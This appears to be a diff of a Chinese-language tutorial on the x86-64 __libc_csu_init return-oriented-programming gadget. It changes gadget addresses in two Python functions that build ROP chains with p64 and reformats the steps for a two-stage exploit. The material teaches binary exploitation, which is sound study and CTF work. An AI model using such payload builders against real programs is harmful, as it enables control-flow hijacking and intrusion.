@@ -63,8 +63,8 @@ mov xxx, dword ptr[yyy]
 
 ```python
 def ropInput(func_addr,first,second ,third,ret_addr):
-	rop_addr1=  0x400d9a
-	rop_addr2 = 0x400d80
+	rop_addr1=  0x400d9c
+	rop_addr2 = 0x400d81
 	input =   p64(rop_addr1) + p64(0) + p64(1) + p64(func_addr) + p64(third) + p64(second) + p64(first) + p64(rop_addr2)  + '\x00'*56 + p64(ret_addr)
 	return input
 ```
@@ -90,8 +90,8 @@ def ropInput(func_addr,first,second ,third,ret_addr):
 
 ```python
 def ropInput(func_addr,first,second ,third,ret_addr):
-	rop_addr1=  0x400d9a
-	rop_addr2 = 0x400d80
+	rop_addr1=  0x400d9e
+	rop_addr2 = 0x400d84
 	input =   p64(rop_addr1) + p64(func_addr) + p64(third) + p64(second) + p64(first) + p64(rop_addr2)  + '\x00'*56 + p64(ret_addr)
 	return input
 ```
@@ -103,14 +103,14 @@ def ropInput(func_addr,first,second ,third,ret_addr):
 
 以上两种利用代码，最低要求都能是栈上事先布置112字节的rop。如果满足以下条件，则可以将该结构分成两部分来加以利用，对事先布置的字节数要求就更少了：
 
-  1. 该程序中可以多次触发漏洞，控制栈上内容和eip
-  2. 在第一次利用漏洞返回到第二次触发漏洞期间，程序对r12-r15寄存器没有任何操作 (条件有点苛刻)
+    1. 该程序中可以多次触发漏洞，控制栈上内容和eip
+    2. 在第一次利用漏洞返回到第二次触发漏洞期间，程序对r12-r15寄存器没有任何操作 (条件有点苛刻)
 
 如何利用：
 
-  1. 第一次跳到rop_addr1，布置r12-r15
-  2. 返回到主函数，重新触发漏洞
-  3. 第二次跳到rop_addr2，执行函数达到目的
+    1. 第一次跳到rop_addr1，布置r12-r15
+    2. 返回到主函数，重新触发漏洞
+    3. 第二次跳到rop_addr2，执行函数达到目的
 
 ### 该结构的实战运用：
 
